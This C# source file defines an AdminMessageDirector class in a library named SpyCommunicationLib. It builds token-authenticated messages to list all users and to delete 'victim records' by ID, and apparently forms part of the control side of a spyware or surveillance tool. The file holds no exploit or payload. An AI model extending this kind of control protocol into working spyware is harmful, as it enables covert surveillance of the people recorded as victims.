
using SpyCommunicationLib.Builders;

namespace SpyCommunicationLib.Directors
{
    /// <summary>
    /// Builds admin-related messages using predefined configurations.
    /// </summary>
    public class AdminMessageDirector : TokenMessageDirector
    {
        private AdminMessageBuilder _builder;

        /// <summary>
        /// Initializes a new instance of the AdminMessageDirector class.
        /// </summary>
        public AdminMessageDirector() : base()
        {
            _builder = new AdminMessageBuilder();
        }

        /// <summary>
        /// Creates a message to request all users.
        /// </summary>
        /// <returns>A SpyMessage configured to get all users.</returns>
        public SpyMessage GetAllUserMessage()
        {
            _builder.SetAction(MessageAction.GetAllUsers);
            ConfigureToken(_builder);
            return _builder.GetMessage();
        }

        /// <summary>
        /// Creates a message to delete a victim record by ID.
        /// </summary>
        /// <param name="record_id">The ID of the record to delete.</param>
        /// <returns>A SpyMessage configured to delete the specified victim record.</returns>
        public SpyMessage GetDeleteVictimRecordMessage(string record_id)
        {
            _builder.SetAction(MessageAction.DeleteVictimRecord);
            ConfigureToken(_builder);
            _builder.SetOptions(new Dictionary<string, string>
            {
                { "record_id", record_id }
            });
            return _builder.GetMessage();
        }
    }
}
